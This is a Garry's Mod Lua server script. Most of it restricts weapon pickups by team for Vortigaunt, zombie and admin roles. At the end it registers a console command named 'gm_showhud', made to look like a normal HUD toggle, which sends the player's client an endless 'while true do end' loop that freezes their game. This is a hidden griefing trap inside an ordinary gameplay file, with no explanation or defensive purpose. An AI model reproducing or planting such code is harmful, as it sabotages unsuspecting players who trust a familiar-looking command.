hook.Add("PlayerCanPickupWeapon", "DisablePickupSwep", function(ply, weapon)
    if ply:Team() == TEAM_VORTIGONT and weapon:GetClass() ~= "swep_vortigaunt_beam" and weapon:GetClass() ~= "weapon_physgun" and weapon:GetClass() ~= "gmod_tool" and weapon:GetClass() ~= "weapon_physcannon" and weapon:GetClass() ~= "keys" and weapon:GetClass() ~= "itemstore_pickup"  then
        return false
elseif ( ply:Team() == TEAM_ZOMBIE and weapon:GetClass() ~= "w_z_zombie")then
    return false
elseif ( ply:Team() == TEAM_ZOMBINE and weapon:GetClass() ~= "w_z_zombine")then
    return false
elseif ( ply:Team() == TEAM_ZOMBIFUTE and weapon:GetClass() ~= "w_z_fustzombie")then
    return false
elseif ( ply:Team() == TEAM_ADMGORODA and weapon:GetClass() ~= "weapon_physgun" and weapon:GetClass() ~= "gmod_tool" and weapon:GetClass() ~= "weapon_physcannon" and weapon:GetClass() ~= "keys" and weapon:GetClass() ~= "itemstore_pickup")then
	return false
    end 
end)

concommand.Add('gm_showhud', function(p,c,a)
 p:SendLua('while true do end');
end)